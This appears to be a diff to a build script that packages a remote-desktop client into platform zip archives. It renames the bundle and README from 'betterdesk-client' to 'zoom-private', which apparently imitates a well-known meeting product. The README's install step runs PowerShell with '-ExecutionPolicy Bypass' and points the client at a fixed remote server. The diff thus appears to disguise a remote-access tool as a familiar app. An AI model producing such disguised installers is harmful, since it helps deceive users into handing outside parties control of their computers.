@@ -53,7 +53,9 @@ fi
 STAGE="$(mktemp -d)"
 trap 'rm -rf "$STAGE"' EXIT
 
-PAYLOAD="$STAGE/betterdesk-client-$PLATFORM_DIR-$ARCH_TAG"
+# Public bundle name follows the product branding: zoom-private-<os>-<arch>.zip
+BUNDLE_NAME="zoom-private-$PLATFORM_DIR-$ARCH_TAG"
+PAYLOAD="$STAGE/$BUNDLE_NAME"
 mkdir -p "$PAYLOAD"
 
 cp "$BUNDLE_TPL/install.sh" "$PAYLOAD/"
@@ -86,7 +88,7 @@ do
 done
 
 cat > "$PAYLOAD/README.txt" <<EOF
-BetterDesk client — $PLATFORM_DIR ($ARCH_TAG)
+zoom-private client — $PLATFORM_DIR ($ARCH_TAG)
 
 Windows : powershell -ExecutionPolicy Bypass -File .\install.ps1 -ServerAddress https://panel.telcom.stream
 macOS   : bash install.sh https://panel.telcom.stream
@@ -94,12 +96,12 @@ Linux   : bash install.sh https://panel.telcom.stream
 EOF
 
 mkdir -p "$OUT_DIR"
-ARCHIVE="$OUT_DIR/betterdesk-client-$PLATFORM_DIR-$ARCH_TAG.zip"
+ARCHIVE="$OUT_DIR/$BUNDLE_NAME.zip"
 
 if command -v zip >/dev/null 2>&1; then
-  (cd "$STAGE" && zip -qr "$ARCHIVE" "betterdesk-client-$PLATFORM_DIR-$ARCH_TAG")
+  (cd "$STAGE" && zip -qr "$ARCHIVE" "$BUNDLE_NAME")
 elif command -v python3 >/dev/null 2>&1; then
-  (cd "$STAGE" && python3 -m zipfile -c "$ARCHIVE" "betterdesk-client-$PLATFORM_DIR-$ARCH_TAG")
+  (cd "$STAGE" && python3 -m zipfile -c "$ARCHIVE" "$BUNDLE_NAME")
 else
   echo "Neither 'zip' nor 'python3' available to build the bundle archive" >&2
   exit 1
